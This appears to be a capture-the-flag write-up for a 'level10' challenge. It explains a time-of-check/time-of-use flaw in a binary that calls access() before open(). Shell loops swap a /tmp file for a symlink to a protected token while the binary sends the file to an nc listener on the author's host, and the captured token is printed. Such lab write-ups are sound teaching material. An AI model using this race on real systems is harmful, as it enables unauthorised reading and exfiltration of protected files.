The `level10` executable sends a file to a server on port 6969, but only if the user executing it have permissions to open the file, as you can see with the `nm` command:

``` shell
         U access@@GLIBC_2.0
0804a064 b completed.6159
         U connect@@GLIBC_2.0
0804a044 W data_start
0804a068 b dtor_idx.6161
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
080486b0 t frame_dummy
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
080486d4 T main
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
0804a060 B stdout@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0
```

It uses `access` system call probably to check the permisions before send it up. I you refer the `access` man page you can see the following warning:

``` 
       Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided.  (In the example just described, a safer alternative
       would be to temporarily switch the process's effective user ID to
       the real ID and then call open(2).)
```

We can use this exploit:

 - First: In one shell instance we can create a infinite loop that will create a file in `/tmp` so we have access to it, and substitute it with a symbolic link to our token file over and over again:

``` shell
while true; do 
    rm -f /tmp/dummy;
    ln -s /home/user/level10/token /tmp/dummy;
    rm -f /tmp/dummy;
    echo "dummy" > /tmp/dummy;
done
```

-Second: In another shell instance just create an infinite loop of the `level10` executable calling this file to our host:

``` shell
while true; do
    ./level10 /tmp/dummy [your/host/path];
done
```

-Third: Lastly in our host machine for example (`192.168.1.18` in our case) put a server listening and discard all the "dummy" content:

``` shell
➜  Resources git:(master) ✗ nc -lk -p 6969 | grep -v 'dummy\|.*( )*.'
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
```

And here you have the token.
